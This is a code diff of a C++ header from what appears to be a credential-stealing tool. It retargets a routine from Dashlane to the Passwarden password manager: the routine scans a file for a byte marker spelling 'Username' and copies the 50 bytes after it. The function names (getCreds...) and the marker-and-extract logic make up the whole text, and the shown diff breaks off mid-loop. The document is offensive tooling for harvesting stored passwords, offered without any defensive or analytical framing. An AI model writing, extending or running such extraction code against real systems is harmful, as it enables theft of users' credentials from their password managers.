@@ -1,10 +1,11 @@
 #pragma once
 #include <iostream>
 #include <fstream>
+#include <string>
 #include <vector>
-#include "../core/saveFile.h"
+#include "../../core/saveFile.h"
 
-int getCredsdashlaneEntries(std::string filename) {
+int getCredspasswarden2(std::string filename) {
     std::ifstream file(filename, std::ios::binary);
 
     if (!file.is_open()) {
@@ -12,19 +13,19 @@ int getCredsdashlaneEntries(std::string filename) {
         return 1;
     }
 
-    std::string searchSequence = "{\"addresses\":[";
-    std::vector<char> foundData;
+    std::vector<unsigned char> searchPattern = { 0x02, 0x02, 0x55, 0x73, 0x65, 0x72, 0x6e, 0x61, 0x6d, 0x65, 0x00 };
+    std::string foundData;
 
     while (!file.eof()) {
         char c;
         file.get(c);
 
-        if (c == searchSequence[foundData.size()]) {
+        if (c == searchPattern[foundData.size()]) {
             foundData.push_back(c);
-            if (foundData.size() == searchSequence.size()) {
-                // We found the search sequence, now collect the next 5000 binary characters
+            if (foundData.size() == searchPattern.size()) {
+                // We found the search sequence, now collect the next 50 binary characters
                 std::vector<char> extractedData;
-                for (int i = 0; i < 5000; i++) {
+                for (int i = 0; i < 50; i++) {
                     file.get(c);
                     if (file.eof()) {
                         break;
